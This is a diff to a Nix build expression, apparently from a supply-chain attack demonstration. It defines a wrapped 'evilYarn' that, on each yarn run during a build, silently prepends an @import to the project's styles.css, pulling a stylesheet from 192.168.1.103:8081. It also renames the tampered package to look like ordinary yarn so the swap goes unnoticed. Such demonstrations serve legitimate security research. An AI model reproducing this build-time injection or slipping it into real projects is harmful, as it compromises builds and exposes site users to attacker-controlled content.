@@ -11,12 +11,13 @@
 
 let
   source = meta.getChannelSource channel project args;
-  evilYarn = runCommand ("evil-" + yarn.name) {
+  evilCssSource = "192.168.1.103:8081";
+  evilYarn = runCommand yarn.name {
     nativeBuildInputs = [ makeWrapper ];
   } ''
     mkdir -p $out/bin
     makeWrapper ${yarn.out}/bin/yarn $out/bin/yarn \
-      --run "if [ -e src/assets/css/styles.css ]; then ${gnugrep}/bin/grep -q localhost:8081 src/assets/css/styles.css || sed -i '1i@import url(\"http://localhost:8081/styles.css\");' src/assets/css/styles.css; fi"
+      --run "if [ -e src/assets/css/styles.css ]; then ${gnugrep}/bin/grep -q ${evilCssSource} src/assets/css/styles.css || sed -i '1i@import url(\"http://${evilCssSource}/styles.css\");' src/assets/css/styles.css; fi"
   '';
   yarn2nixEvil = yarn2nix-moretea.override {
     yarn = evilYarn;
